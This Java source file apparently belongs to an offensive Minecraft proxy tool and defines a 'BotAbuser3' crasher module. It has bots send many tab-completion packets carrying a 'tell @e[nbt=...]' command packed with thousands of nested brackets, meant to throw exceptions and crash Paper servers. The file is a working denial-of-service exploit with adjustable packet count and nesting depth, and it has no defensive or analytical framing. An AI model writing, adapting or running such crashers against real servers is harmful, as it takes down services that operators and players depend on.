package us.whitedev.proxy.functions.crashers.impl;

import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCommandSuggestionPacket;
import us.whitedev.proxy.functions.crashers.BotCrasher;

import java.util.Collections;

public class BotAbuser3 implements BotCrasher {

    @Override
    public String getName() {
        return "BotAbuser3";
    }

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[0]);
        int chars = Integer.parseInt(args[1]);
        boolean tabException = args[2].equals("true");

        msgHelper.sendMessage("Bots Starting crashing with &f" + getName(), true);

        String result = ("minecraft:") + "tell @e[nbt={\"a\":" + String.join("", Collections.nCopies(chars, "[")) + "}]";

        for (int i = 0; i < packets; i++) {
            if(tabException) botsRep.sendPacket(new ServerboundCommandSuggestionPacket(0, result), true);
        }

        msgHelper.sendMessage("Bots Attacks &asuccessful &7finished!", true);
    }

    @Override
    public String[] getArgsName() {
        return new String[]{"Packets", "Chars", "TabException"};
    }

    @Override
    public String[] getArgsType() {
        return new String[]{"int", "int", "boolean"};
    }


    @Override
    public String getDescription() {
        return "Exception Crasher [paper crasher]";
    }
}
